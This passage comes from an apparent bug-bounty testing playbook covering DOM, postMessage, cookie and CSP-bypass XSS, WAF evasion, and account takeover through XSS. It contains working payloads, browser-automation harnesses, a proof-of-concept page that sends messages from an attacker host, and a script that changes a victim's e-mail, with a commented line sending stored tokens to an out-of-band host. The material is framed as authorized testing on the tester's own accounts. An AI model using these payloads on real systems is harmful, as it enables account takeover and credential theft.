  `new Function`, `setTimeout` with a string, `script.src`, and the framework escapes `dangerouslySetInnerHTML`,
  `v-html`, `[innerHTML]` with `bypassSecurityTrustHtml`, `{@html}`. Typical features: "you searched for",
  client-side error and flash messages (`?error=`), tab and anchor handling, tracking parameters copied into
  the page, old static helper pages, and API-documentation viewers that load a specification from `?url=`.
- **Test:** list source-to-sink candidates by grep, then let the browser confirm: put a canary containing `<x>`
  in every source, hook the HTML sinks, and see which sink receives it undecoded. A hash payload never reaches
  the server, so nothing server-side filters or logs it.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-013"; mkdir -p "$D"
  # static: sinks with a URL source in the same statement, and the parameter names the client code reads
  grep -rnoE '.{0,140}(innerHTML|outerHTML|insertAdjacentHTML|document\.write(ln)?|dangerouslySetInnerHTML|v-html|bypassSecurityTrustHtml|\.html\(|\.append\(|eval\(|new Function|setTimeout\(["`]).{0,140}' "$E/recon/$H/js/" \
    | grep -E 'location|hash|search|referrer|window\.name|URLSearchParams|query|params' | cut -c1-320 | head -40
  grep -rhoE "(searchParams\.get|getParameterByName|query\.get)\([\"'][A-Za-z_]{2,30}" "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -30
  cat > "$D/sinks.js" <<'JS'
  // usage: sinks.js <url carrying the canary xss013c<x>> <evidence dir> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd });
    await c.addInitScript(() => {
      const hit = (sink, v) => { if (String(v).includes('xss013c')) console.log('SINK ' + sink + ' ' + String(v).slice(0, 300)); };
      for (const k of ['innerHTML', 'outerHTML']) {
        const d = Object.getOwnPropertyDescriptor(Element.prototype, k);
        Object.defineProperty(Element.prototype, k, { get: d.get, set(v) { hit(k, v); d.set.call(this, v); } });
      }
      for (const [o, k] of [[Document.prototype, 'write'], [Document.prototype, 'writeln'], [Element.prototype, 'insertAdjacentHTML']]) {
        const f = o[k]; o[k] = function (...a) { hit(k, a.join(' ')); return f.apply(this, a); };
      }
    });
    const p = await c.newPage();
    p.on('console', m => m.text().startsWith('SINK') && fs.appendFileSync(`${dir}/sinks.txt`, `${url}\n  ${m.text()}\n`));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(4000);
    if (await p.evaluate(() => document.getElementsByTagName('x').length)) fs.appendFileSync(`${dir}/sinks.txt`, `${url}\n  PARSED: an <x> element exists in the DOM\n`);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png` }); await b.close();
  })();
  JS
  C='xss013c%3Cx%3E'
  grep -hoE "https?://$H/[^\"' <>#?]*" "$E/recon/$H/"*.txt | sort -u | head -60 | while read -r u; do
    NODE_PATH="$(npm root -g)" node "$D/sinks.js" "$u?q=$C&error=$C&message=$C&next=$C&xss013c=1#$C" "$D" "${HDR[@]}"; sleep 1; done
  cat "$D/sinks.txt"
  #    innerHTML, insertAdjacentHTML, jQuery .html() or $()   <img src=x onerror=alert(document.domain)>   (a script tag does not run there)
  #    document.write                                         <script>alert(document.domain)</script>
  #    eval, new Function, setTimeout(string)                 alert(document.domain), with the string breakout the statement needs
  #    AngularJS template compiled from the value             {{constructor.constructor('alert(document.domain)')()}}
  NODE_PATH="$(npm root -g)" node "$D/sinks.js" "$T/help#%3Cimg%20src=x%20onerror=alert(document.domain)%3E" "$D" "${HDR[@]}"; cat "$D/dialog.txt"
  ```
  Add the parameter names from the second grep to the sweep URL. A page behind a login needs the cookie lines
  from `fire.js` in XSS-006 added to `sinks.js`.
- **Proof:** `dialog.txt` with the URL and `$H`, the `sinks.txt` line naming the sink and the value it received,
  the bundle excerpt from source to sink (file and offset), the screenshot, and the single link. State that the
  server never sees the payload when it travels in the fragment.
- **Not a finding when:** the sink receives the value still percent-encoded. Current browsers encode `<`, `>` and
  `"` in `location.search` and, in most cases, in `location.hash`; the payload survives only where the code
  decodes it (`decodeURIComponent`, `URLSearchParams`, a router) or where the sink is a code sink that needs no
  angle brackets. A proof that works only in Internet Explorer or legacy Edge is not accepted. The grep hit is
  `$(location.hash)` with a jQuery that treats the string as a selector only. The value goes through DOMPurify
  first (XSS-008). The sink sits in a vendored library with no reachable source: "outdated jQuery" is not a
  finding. `require-trusted-types-for 'script'` in the policy blocks the assignment.
- **Escalate:** XSS-018. A navigation sink (`location = value`) is XSS-004. A value that the page stores in web
  storage and replays on every visit makes the XSS persistent for that browser: say so. A sink fed by an object
  merge of URL parameters is a prototype-pollution gadget: PPL items.

### XSS-014 · A message event listener passes postMessage data to a DOM sink without checking the sender's origin

| | |
|---|---|
| **Severity** | Medium standalone; High with XSS-018, the usual case when the listener is on a login or checkout page |
| **Requires** | postmessage, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - DOM · CWE-79 |
| **Prior art** | #231053, #603764, #900619, #398054 |

- **Where:** every page whose scripts register a `message` listener: login and SSO pages, checkout and payment
  frames, embeddable widgets, OAuth pop-up helpers, chat and support widgets, analytics and tag-manager SDKs
  running on the target origin. Listeners that exist only after login need B's session.
- **Test:** read each handler. The origin check is absent, or weak: `indexOf`, `includes`, `startsWith`,
  `endsWith`, `match` or an unanchored regular expression on `event.origin`, or a check on a field inside
  `event.data`. Then follow the data to a sink: `innerHTML`, `document.write`, `eval`, jQuery `$()` or `.html()`,
  a `location` assignment (a `javascript:` URL), `script.src`. Shape a message that takes that path and send it
  from another origin to a window or frame holding the page.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-014"; mkdir -p "$D"
  grep -rnoE '.{0,40}(addEventListener\(\s*["'"'"']message|\.onmessage\s*=).{0,400}' "$E/recon/$H/js/" | cut -c1-520 | head -20
  curl -sS "${HDR[@]}" -D- -o /dev/null "$T/login" | grep -iE '^(x-frame-options|content-security-policy|cross-origin-opener-policy)'
  cat > "$D/pm.js" <<'JS'
  // usage: pm.js <target url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  // run 1 (no poc.html yet) writes listeners.txt; run 2 serves poc.html from a foreign origin, clicks #go, records dialogs
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd });
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    await c.addInitScript(() => { const add = EventTarget.prototype.addEventListener;
      EventTarget.prototype.addEventListener = function (t, f, o) {
        if (t === 'message') console.log('LISTENER ' + location.href + '\n' + String(f).slice(0, 3000)); return add.call(this, t, f, o); }; });
    c.on('page', pg => {
      pg.on('console', m => m.text().startsWith('LISTENER') && fs.appendFileSync(`${dir}/listeners.txt`, m.text() + '\n\n'));
      pg.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${pg.url()} -> ${m.message()}\n`); await m.accept(); });
    });
    const p = await c.newPage(), poc = `${dir}/poc.html`;
    if (fs.existsSync(poc)) {
      await c.route(u => u.hostname === 'xss014-attacker.example', r => r.fulfill({ contentType: 'text/html', body: fs.readFileSync(poc, 'utf8') }));
      await p.goto('https://xss014-attacker.example/poc.html?t=' + encodeURIComponent(url)); await p.click('#go');
    } else await p.goto(url);
    await p.waitForTimeout(8000); await p.screenshot({ path: `${dir}/page-${Date.now()}.png` }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/pm.js" "$T/login" "$D" - "${HDR[@]}"; cat "$D/listeners.txt"
  cat > "$D/poc.html" <<'EOF'
  <!doctype html><button id="go">open</button>
  <script>
  const target = new URLSearchParams(location.search).get('t');
  const msgs = [                                  // shape these after the handler source in listeners.txt
    '<img src=x onerror=alert(document.domain)>',
    { type: 'render', html: '<img src=x onerror=alert(document.domain)>' },
    JSON.stringify({ action: 'navigate', url: 'javascript:alert(document.domain)' })
  ];
  document.getElementById('go').onclick = () => {
    const w = window.open(target);                // or an <iframe src=target> and its contentWindow, when the page may be framed
    setInterval(() => msgs.forEach(m => w.postMessage(m, '*')), 700);
  };
  </script>
  EOF
  NODE_PATH="$(npm root -g)" node "$D/pm.js" "$T/login" "$D" - "${HDR[@]}"; cat "$D/dialog.txt"
  ```
  A handler wrapped by an error tracker or a zone library shows the wrapper in `listeners.txt`; read the real
  one from the grep output.
- **Proof:** `dialog.txt` showing the target page and `$H` after a message sent from
  `https://xss014-attacker.example`; the handler source with the missing or weak origin check and the sink;
  `poc.html`; and the interaction: one click to open the pop-up, or none when the page can be framed.
- **Not a finding when:** the handler compares `event.origin` with an exact list and drops your message. The data
  reaches only text sinks or application state. The page can be neither framed (`X-Frame-Options`,
  `frame-ancestors`) nor reached through a window handle (`Cross-Origin-Opener-Policy: same-origin` severs it),
  so no foreign origin can deliver the message. The listener belongs to a third-party widget inside its own
  frame and origin (`third-party`). The handler posts data out to `*` instead of writing it in: a leak, not XSS,
  and a CSD item.
- **Escalate:** XSS-018. A weak check such as `endsWith` needs a look-alike host to exploit: say which host would
  pass and prove the sink with the check's own logic quoted; do not register domains that imitate the target.
  Handlers that forward tokens are OAU and CSD items.

### XSS-015 · An injection blocked by the Content-Security-Policy executes through an allow-listed script source, a missing base-uri or a file on the application origin

| | |
|---|---|
| **Severity** | None standalone; lifts a blocked injection to the level of the item that found it |
| **Requires** | browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - Generic · CWE-79 |
| **Prior art** | #2279346, #1481207, #1665658, #1380157 |

- **Where:** no asset fact gates this item: it runs only when another item of this chapter has produced markup
  injection that the policy stops (the element is in the DOM, the console reports a violation, no dialog).
  Without such an injection mark it `skipped` with that note: a weak policy alone is `missing-headers`. Work on
  the policy of the exact response that holds the injection, then on every other response of the same origin.
- **Test:** read the policy directive by directive and match each weakness to its technique: a host in
  `script-src` that serves attacker-chosen JavaScript (a JSONP endpoint, a public CDN, a storage wildcard);
  `'self'` plus a callback endpoint or an uploaded file on the origin; no `base-uri` while the page loads
  scripts by relative URL after the injection point; a nonce that repeats; a script gadget already on the page
  that turns inert markup into code; responses of the same origin that carry no policy.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-015"; mkdir -p "$D"
  URL="$T/search?q=xss015"                    # the page that holds the injection
  curl -sS "${HDR[@]}" -D- -o /dev/null "$URL" | grep -i '^content-security-policy' | tr ';' '\n' | sed 's/^ *//' | tee "$D/policy.txt"
  #    Content-Security-Policy-Report-Only                         not enforced: nothing to bypass
  #    script-src with 'unsafe-inline' and no nonce or hash        inline handlers run: nothing to bypass
  #    'self'                                                      a callback endpoint on the origin, or an uploaded file (XSS-009, XSS-010)
  #    cdnjs.cloudflare.com, cdn.jsdelivr.net, unpkg.com, ajax.googleapis.com
  #                                                                load AngularJS 1.x from it and inject a template
  #    a host with a JSONP endpoint                                <script src="https://THAT-HOST/path?callback=alert(document.domain)//">
  #    *.amazonaws.com, *.cloudfront.net, storage.googleapis.com, *.blob.core.windows.net
  #                                                                host a one-line script in your own bucket there
  #    nonce or 'strict-dynamic', no base-uri, relative script URLs after the injection
  #                                                                <base href="https://HOST-YOU-CONTROL/">
  #    the same nonce in two responses, or a cached page           <script nonce="THAT-NONCE">alert(document.domain)</script>
  #    a gadget library on the page (AngularJS, Knockout, a tooltip or modal that renders data-* as HTML)
  #                                                                the markup that library turns into code
  # callback endpoints on the origin: the answer must start with the callback and have a script-compatible type
  grep -rhoE "[\"'/][A-Za-z0-9_./-]*\?[^\"' ]*(callback|jsonp|cb)=" "$E/recon/$H/" | sort -u | head
  curl -sS "${HDR[@]}" -D- --get --data-urlencode 'callback=alert(document.domain)//' "$T/api/v1/suggest" | head -20
  # responses of the origin that carry no policy at all
  for u in "/xss015-404" "/robots.txt" "/static/" "/api/v1/" ; do
    printf '%s  ' "$u"; curl -sS "${HDR[@]}" -D- -o /dev/null "$T$u" | grep -ci '^content-security-policy'; sleep 1; done
  #    candidates to place in the injection point
  #    <script src="/api/v1/suggest?callback=alert(document.domain)//"></script>
  #    <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
  #      <div ng-app ng-csp><input autofocus ng-focus="$event.composedPath()|orderBy:'(z=alert)(document.domain)'"></div>
  #    <base href="https://HOST-YOU-CONTROL/">        (that host answers the page's relative script paths with alert(document.domain))
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    await c.addInitScript(() => document.addEventListener('securitypolicyviolation', e => console.log('CSPV ' + e.violatedDirective + ' ' + e.blockedURI)));
    p.on('console', m => m.text().startsWith('CSPV') && fs.appendFileSync(`${dir}/violations.txt`, `${url}\n  ${m.text()}\n`));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(url); await p.waitForTimeout(5000);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/violations.txt" "$D/dialog.txt"
  ```
  As a script source the browser refuses `image/*`, `audio/*`, `video/*` and `text/csv` responses, and any
  non-script type when `nosniff` is set; other types load. With `'strict-dynamic'` host allow-lists are ignored,
  so only the nonce, `base-uri` and gadget rows apply.
- **Proof:** the enforced policy header of the page, `violations.txt` showing the plain payload blocked, and
  `dialog.txt` showing the bypass payload firing on the same page with `$H`. Report it as part of the injection
  finding, with the policy weakness as the reason the mitigation fails.
- **Not a finding when:** there is no injection to carry it. The JSONP endpoint restricts the callback to
  `[A-Za-z0-9_.]`: it can call an existing function but cannot run your code. The gadget needs `'unsafe-eval'`
  and the policy does not grant it. The technique works only against the `Report-Only` header. The bypass uses
  a CDN path the policy does not actually allow.
- **Escalate:** the level of the underlying item, then XSS-018. When nothing bypasses the policy, say so in the
  report of the injection: some programmes pay a reduced amount for it. Without script, a missing `form-action`
  or `img-src` still lets injected markup send a CSRF token off-site (an unclosed `<img src='https://…?` that
  swallows the page up to the next quote): show that as the impact of the HTML injection and go to XSS-018.

### XSS-016 · A cookie value is written into the page unencoded and the cookie can be set from outside the session

| | |
|---|---|
| **Severity** | None standalone; Medium when a request parameter sets the cookie; High with XSS-018 |
| **Requires** | browser |
| **Excluded by** | self-xss |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-site Scripting (XSS) - Generic · CWE-79 |
| **Prior art** | #690072, #748217, #534450, #206737 |

- **Where:** no asset fact gates this item: the `reflect` probe covers parameters and paths, not cookies, so the
  item carries its own probe. Cookies that the server echoes (language, theme, currency, region, a greeting
  name, flash messages, tracking and experiment ids copied into inline script) and cookies that front-end code
  reads from `document.cookie` into a sink.
- **Test:** two questions. Which cookie values come back raw in HTML or script? And who can set that cookie in
  the victim's browser: a request parameter that the application copies into it, a response-header injection, or
  script on a sibling subdomain writing a `Domain=` cookie for the parent? Without the second answer the first
  is self-XSS.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-016"; mkdir -p "$D"
  # 1. which cookies are echoed (logged out; repeat with a copy of the A session for authenticated pages)
  curl -sS "${HDR[@]}" -c "$D/jar.txt" -o /dev/null "$T/"
  sed 's/^#HttpOnly_//' "$D/jar.txt" | awk '!/^#/ && NF>=7 {print $6}' | sort -u | while read -r n; do
    c=$(curl -sS "${HDR[@]}" -b "$n=xss016$n\"'<>" "$T/" | grep -a -c "xss016$n"); echo "$c $n"; sleep 1; done
  grep -rnoE '.{0,80}document\.cookie.{0,120}' "$E/recon/$H/js/" | grep -E 'innerHTML|write|eval|\.html\(' | cut -c1-260 | head
  # 2. does a parameter set it?
  for q in 'lang' 'locale' 'currency' 'theme' 'region' 'ref' 'utm_source'; do
    curl -sS "${HDR[@]}" -D- -o /dev/null "$T/?$q=xss016probe" | grep -i '^set-cookie' | grep -i 'xss016probe' | sed "s/^/$q -> /"; sleep 1; done
  # 3. the two-step proof: the setter link, then any page that echoes the cookie
  #    a cookie value cannot hold ; or a space:   "><svg/onload=alert(document.domain)>
  cat > "$D/cookie.js" <<'JS'
  // usage: cookie.js <setter url> <page url> <evidence dir> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [setter, page, dir, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    await p.goto(setter); await p.waitForTimeout(1500);
    fs.writeFileSync(`${dir}/cookies.json`, JSON.stringify(await c.cookies(), null, 1));
    await p.goto(page); await p.waitForTimeout(4000);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/cookie.js" "$T/?lang=%22%3E%3Csvg/onload=alert(document.domain)%3E" "$T/" "$D" "${HDR[@]}"; cat "$D/dialog.txt"
  ```
- **Proof:** with a setter parameter: the link that sets the cookie, `cookies.json` showing the stored value with
  its `Domain`, `Path` and lifetime, and `dialog.txt` showing `$H` on the next page load. The victim opens one
  link and the payload then fires on every page that echoes the cookie until it expires.
- **Not a finding when:** the only way to place the value is to edit the cookie in your own browser
  (`self-xss`). The cookie has the `__Host-` prefix, or is signed or encrypted and a changed value is discarded.
  The setter needs a network position on plain HTTP (`mitm`). The sibling-subdomain route is hypothetical: with
  no script execution or takeover on a sibling shown, record the sink as `parked`.
- **Escalate:** the missing half comes from other chapters: CRL items (a `Set-Cookie` through header injection),
  STO items (a taken-over subdomain writes the parent-domain cookie), XSS-009 on a sibling host, CCH items (a
  response that echoes the cookie and is cached). With the delivery shown, continue to XSS-018.

### XSS-017 · A payload the WAF blocks is delivered in a form the WAF does not parse the way the application or the browser does

| | |
|---|---|
| **Severity** | None standalone; restores the level of the injection it unblocks |
| **Requires** | waf, reflect\|user-content, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - Generic · CWE-79 |
| **Prior art** | #800360, #716761, #1420529, #1615743 |

- **Where:** an injection point that another item of this chapter has already proven with harmless markers (the
  context is known and the needed characters come back raw) and where the executing payload gets a block page,
  a 403 or 406, or a challenge. Confirm that the WAF answers and not the application: the block response has its
  own body and headers (a ray or reference id, a support id, a vendor name) and appears for the same payload on
  any path.
- **Test:** a method, not a list. First find the smallest token that triggers the block. Then rebuild the payload
  around it, in this order: a tag or event the rule set does not know; the same call without the blocked word;
  the blocked part moved out of the request entirely; an encoding the application decodes and the WAF does not;
  a place in the request the WAF does not inspect. Every blocked request counts against the address: keep the
  bisection under about thirty requests and pause between them.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-017"; mkdir -p "$D"
  probe() { curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code}' --get --data-urlencode "q=xss017 $1" "$T/search"; }
  for t in '<' '<x' '<svg' '<svg onload' 'onload=' 'onerror=' 'ontoggle=' 'onfocus=' 'alert' 'alert(' '(document.domain)' \
           'javascript:' 'eval(' 'location.hash' '<details open ontoggle=x>' '<xss id=x tabindex=1 onfocus=x>'; do
    printf '%s  %s\n' "$(probe "$t")" "$t"; sleep 2; done | tee "$D/tokens.txt"
  ```
  ```text
  1. another tag or event      <details open ontoggle=alert(document.domain)>
                               <xss id=x tabindex=1 onfocus=alert(document.domain)>      plus #x on the URL
                               <svg><animate onbegin=alert(document.domain) attributeName=x dur=1s>
                               <xss style=display:block;content-visibility:auto oncontentvisibilityautostatechange=alert(document.domain)>
  2. the call, respelled       top['al'+'ert'](document['dom'+'ain'])      [document.domain].find(alert)
                               window.onerror=alert;throw document.domain   (no parentheses)
  3. out of the request        <svg onload=eval(location.hash.slice(1))>   with   #alert(document.domain)
                               <svg onload=location=name>                  opened from a page that set window.name to javascript:alert(document.domain)
  4. an encoding only the application decodes
                               %253Csvg%2520onload=…   (decoded twice)      %u003Csvg   (IIS)      ＜svg onload=…＞   (full-width, normalised later)
                               inside an attribute or URL: &#x61;lert(document.domain)   jav&#x09;ascript:   and inside script: alert(document.domain)
                               output upper-cased by the application: entity-encode the handler body, &#X61;&#X6C;&#X65;&#X72;&#X74;(1)
  5. where the WAF does not look
                               the same parameter in a multipart or JSON body, when the framework binds either
                               the parameter twice, when the application joins the values:  q=<svg&q=onload=alert(document.domain)>
                               the payload after several kilobytes of padding in the body, past the inspected size
  ```
  ```bash
  # the rebuilt payload: one request through the WAF, then the browser
  URL=$(curl -sS "${HDR[@]}" -o "$D/response.html" -w '%{url_effective}' --get \
    --data-urlencode 'q=<details open ontoggle=alert(document.domain)>' "$T/search"); head -c 300 "$D/response.html"
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('dialog', async m => { fs.appendFileSync(`${dir}/dialog.txt`, `${p.url()} -> ${m.message()}\n`); await m.accept(); });
    const r = await p.goto(url); fs.appendFileSync(`${dir}/dialog.txt`, `status ${r && r.status()} ${url}\n`);
    await p.waitForTimeout(4000); await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" - "${HDR[@]}"; cat "$D/dialog.txt"
  ```
- **Proof:** it belongs inside the report of the underlying XSS: `tokens.txt` (what is blocked), the final
  payload, and `dialog.txt` showing status 200 and `$H` on the public host name, through the WAF. Do not file a
  report whose claim is "WAF bypass".
- **Not a finding when:** the payload passes the WAF and the application encodes it: there was no injection. The
  bypass works only against the origin server's address, which is a different asset: check scope before touching
  it. The payload needs bytes a browser would encode, so it runs only from `curl`. The block comes from the
  application's own validation (same body as other validation errors, no vendor headers): treat it as a filter
  inside the context item. A WAF rule gap without an injection belongs to the vendor (`third-party`).
- **Escalate:** back to the item that found the injection, then XSS-018. Note which technique passed: the same
  WAF fronts the other assets of the programme, and the note saves the bisection there.

### XSS-018 · Script running in the application origin takes over the victim's account

| | |
|---|---|
| **Severity** | High standalone; Critical when the victim is an administrator or staff role, or when a stored payload needs no click |
| **Requires** | login, two-accounts, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-site Scripting (XSS) - Generic · CWE-79 |
| **Prior art** | #397497, #723060, #604120, #135154 |

- **Where:** any item of this chapter whose payload executes on the origin of the authenticated application, or
  on a same-site origin its cookies and API trust. Before writing a payload, read in B's own session which
  routes to takeover the origin leaves open: an e-mail change that asks for neither the current password nor a
  confirmation at the old address; a password change without the current password; a session cookie without
  `HttpOnly`; a token in `localStorage`, `sessionStorage`, the page source or an API response; an API-key or
  personal-access-token page; "link another login provider"; inviting a new administrator.
- **Test:** replace `alert` with the smallest script that completes one of those routes against B, our own victim
  account, deliver it through the injection that already works, and show the result from outside B's browser:
  the attacker signs in as B, or calls one identity endpoint with B's token. `HttpOnly` does not end the test:
  the script does not need to read the cookie to send requests that carry it.
- **How:**
  ```bash
  D="$E/evidence/$H/XSS-018"; mkdir -p "$D"
  ALIAS='replace-with-an-inbox-of-ours-that-is-not-Bs@example.org'
  curl -sS "${HDR[@]}" $B -D- -o /dev/null "$T/" | grep -i '^set-cookie'                                  # HttpOnly on the session cookie?
  curl -sS "${HDR[@]}" $B "$T/settings/account" | grep -a -i -o '.\{0,60\}csrf.\{0,90\}' | head -3         # where the CSRF token sits
  cat > "$D/payload.js" <<'EOF'
  (async () => {   // runs in B's page; edit the two paths and the token lookup to match the application
    const page = await (await fetch('/settings/account')).text();
    const csrf = (page.match(/csrf[-_]?token"[^>]*?(?:content|value)="([^"]+)"/i) || [])[1] || '';
    const r = await fetch('/api/v1/me', { method: 'PATCH', headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrf },
      body: JSON.stringify({ email: 'ATTACKER_ALIAS' }) });
    document.title = 'xss018 ' + r.status;
  })();
  EOF
  B64=$(sed "s/ATTACKER_ALIAS/$ALIAS/" "$D/payload.js" | base64 -w0)
  # delivery: the injection that already works (example: the reflected parameter from XSS-001)
  URL=$(curl -sS "${HDR[@]}" -o /dev/null -w '%{url_effective}' --get --data-urlencode "q=<svg onload=\"eval(atob('$B64'))\">" "$T/search")
  cat > "$D/fire.js" <<'JS'
  // usage: fire.js <url> <evidence dir> <account .headers file, or - for logged out> <the HDR arguments>
  const { chromium } = require('playwright'), fs = require('fs');
  (async () => {
    const [url, dir, acct, ...h] = process.argv.slice(2), hd = {}; let ua;
    for (let i = 0; i + 1 < h.length; i += 2) h[i] === '-A' ? ua = h[i + 1] : hd[h[i + 1].split(':')[0]] = h[i + 1].replace(/^[^:]*:\s*/, '');
    const b = await chromium.launch(), c = await b.newContext({ userAgent: ua, extraHTTPHeaders: hd }), p = await c.newPage();
    if (acct !== '-') await c.addCookies((fs.readFileSync(acct, 'utf8').match(/^cookie:\s*(.*)$/im) || [, ''])[1].split(/;\s*/)
      .filter(x => x.includes('=')).map(x => ({ name: x.split('=')[0], value: x.slice(x.indexOf('=') + 1), url: new URL(url).origin })));
    p.on('request', q => q.method() !== 'GET' && fs.appendFileSync(`${dir}/victim-requests.txt`, `${q.method()} ${q.url()}\n`));
    await p.goto(url); await p.waitForTimeout(6000);
    fs.appendFileSync(`${dir}/victim-requests.txt`, `title: ${await p.title()}\n`);
    await p.screenshot({ path: `${dir}/page-${Date.now()}.png`, fullPage: true }); await b.close();
  })();
  JS
  NODE_PATH="$(npm root -g)" node "$D/fire.js" "$URL" "$D" "$E/accounts/B.headers" "${HDR[@]}"; cat "$D/victim-requests.txt"
  # the state change, seen from the victim account
  curl -sS "${HDR[@]}" $B "$T/api/v1/me" | grep -a -o '"email":"[^"]*"' | tee "$D/after.txt"
  # then, as the attacker: request a password reset for $ALIAS, set a password, sign in as B, screenshot the account page
  #    token route instead (needs the callback host):
  #    new Image().src='https://xss018.OOB/?t='+encodeURIComponent(localStorage.getItem('access_token'))    (OOB = the value of $OOB)
  #    curl -sS "${HDR[@]}" -H "Authorization: Bearer <captured token>" "$T/api/v1/me"                      (one identity call, B's data only)
  ```
  A policy without `'unsafe-eval'` blocks `eval(atob(…))`: put the statements directly in the handler, or load
  the file from a script source the policy allows (XSS-015).
- **Proof:** the chain on our own accounts, in order: the delivery (the link, or where the stored payload sits);
  `victim-requests.txt` from B's browser showing the state-changing request the script made; `after.txt` with
  B's account now holding the attacker's address (or the captured token in the callback log); the attacker
  signed in as B, or the single identity call answered with B's profile. State which control was missing: no
  re-authentication on e-mail change, a readable token, and so on. Then restore B's e-mail and password and
  revoke anything the script created.
- **Not a finding when:** every route needs something the script cannot supply (the current password, a second
  factor, a confirmation link sent to the old address) and no token is readable: there is no takeover, and the
  XSS keeps the level of its own item; say what the script can still read and do. The script runs on a sibling
  origin: it cannot read the application's responses unless CORS trusts that origin (COR items), and it can
  only send cookie-bearing requests that a same-site CSRF could send (CSR items). A screenshot of
  `alert(document.cookie)` is not a takeover.
- **Escalate:** with a victim that holds an administrator role (`priv-accounts`), the same script invites the
  attacker as administrator: tenant takeover, on our own tenant only. A stored delivery plus this payload is
  wormable: state it, never run it. An API key created by the script survives the victim's password change:
  mention it as persistence the programme should weigh, and revoke the key.

## Graveyard

